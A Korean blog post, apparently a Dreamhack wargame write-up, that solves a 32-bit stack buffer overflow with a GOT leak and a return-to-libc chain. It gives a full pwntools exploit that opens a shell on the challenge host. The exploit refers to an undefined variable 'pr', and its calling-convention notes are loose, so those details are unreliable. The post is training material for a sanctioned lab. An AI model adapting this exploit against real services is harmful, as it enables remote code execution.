---
layout: post
title: Dreamhack | Basic_ROP_x86
subtitle: Dreamhack-Pwnable Basic_ROP_x86
categories: Pwnable
tags: [Pwnable, dreakhack, Shell, Pentest]
---

**본 문제는 Dreamhack을 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

문제는 <a href = "https://dreamhack.io/wargame/challenges/">dreamhack.io</a>를 들어가시면 확인할 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/196334435-036ed9a0-4361-4973-bb39-744ee2d72dfc.jpg" width = 500>
</p>

리턴 지향 프로그래밍 과정에 속한 문제이다. 따라서 해당 문제는 ROP로 진행하면 될 것이다.

## 문제 풀이

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

해당 코드에서는 `system`함수와 `/bin/sh`의 문자열이 보이지 않는다.

```C
char buf[0x40] = {};
read(0, buf, 0x400);
```

`buf`의 공간은 0x40인데 `read`는 총 0x400을 진행하므로 해당 부분에서 버퍼 오버플로우가 발생한다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/196335754-7f8f1aa4-b5b8-4a6c-91f3-18431b82e658.jpg" width = 450>
</p>

* 위 빨간 네모칸을 통해서 `[ebp-0x44]` 위치에 buf에 할당하고 0x400크기 만큼 `read`한다.

* 아래 빨간 네모칸을 통해서 `[ebp-0x44]`에 해당하는 buf를 buf의 크기인 **0x40**만큼 `write`한다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/196336809-97546061-906f-4c15-86b0-1bda34d100ad.jpg" width = 340>
</p>

1. system 주소 계산을 위한 **GOT 출력**
2. `/bin/sh` 문자열
3. 출력된 got를 통한 **system 주소**

### 1. GOT 출력

`ret`까지 dummy값으로 채우고 `write`함수를 이용하여 인자를 `write@got`를 넣는다면 GOT 출력이 된다.

`write`함수는 3개의 인자를 필요로 하기에 `[pop edi, pop esi, pop edx, ret]`를 찾아야 했지만, 찾을 수 없었다.

**32bit 함수 호출 규약을 확인해보면 32bit에서는 인자의 이름이 중요하지 않기에 pop 개수만 맞추기만 하면 된다.**

또한, 64bit 아키텍쳐와 다르게 32bit에서는 순서가 **함수 호출 -> 가젯 -> 인자** 순서인 것을 알아야 한다.

이후, `system`과 `/bin/sh`을 보내야 하기에 main을 다시 호출하여 페이로드를 전송한다.

```python
# [1] Read Got Leak

payload = b'A' * 0x48
payload += p32(write_plt)
payload += p32(pppr) # anything three pops
payload += p32(1) + p32(write_got) + p32(4) + p32(main)
p.send(payload)

write = u32(p.recvuntil(b'\xf7')[-4:]) 
log.info(hex(write))
```

### 2. /bin/sh 문자열

해당 문자열을 bss 공간에 넣어서 진행할 수 있지만, 한 줄로 `/bin/sh`의 offset을 알 수 있다.

got 출력을 통해 libc_base를 구할 수 있으므로 해당 offset에서 libc_base를 더하면 `/bin/sh`의 문자열 주소를 알 수 있다.

```python
binsh_offset = list(libc.search(b'/bin/sh\x00'))[0]
```

### 3. system 주소

우리는 write@got를 출력하면서 해당 값을 받아 올 수 있었다. 이 값을 write의 offset값으로 뺀다면 **libc_base**를 구할 수 있다.

그리고, libc_base에 system의 offset을 더한다면 system의 주소를 구할 수 있게 된다.

```python
lb = write - libc.symbols['write']
bin_sh = lb + binsh_offset
system = lb + libc.symbols['system']
```

### Payload

```python
from pwn import *    

p = remote('host3.dreamhack.games', 14977)
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')
r = ROP(e)

write_plt = e.plt['write']
write_got = e.got['write']
main = e.symbols['main']

pppr = 0x08048689
binsh_offset = list(libc.search(b'/bin/sh\x00'))[0]

# [1] Read Got Leak

payload = b'A' * 0x48
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1) + p32(write_got) + p32(4) + p32(main)

p.send(payload)
write = u32(p.recvuntil(b'\xf7')[-4:])

# [2] System

lb = write - libc.symbols['write']
bin_sh = lb + binsh_offset
system = lb + libc.symbols['system']
log.info(hex(write))
log.info(hex(system))

# [3] Exploit

payload = b'A' * 0x48
payload += p32(system) + p32(pr) + p32(bin_sh) # system('/bin/sh')

p.send(payload)
p.interactive()
```

* 32bit와 64bit의 함수 호출 규약이 다르다는 것을 알면 금방 풀 수 있다.

### 함수 호출 규약

* **Linux** 
   * EDI, ESI, EDX, ECX, R8, R9

* **Window**
   * ECX, EDX, R8, R9

* **32bit**
   * 함수 호출 -> 가젯 -> 인자

* **64bit**
   * 가젯 -> 인자 -> 함수 호출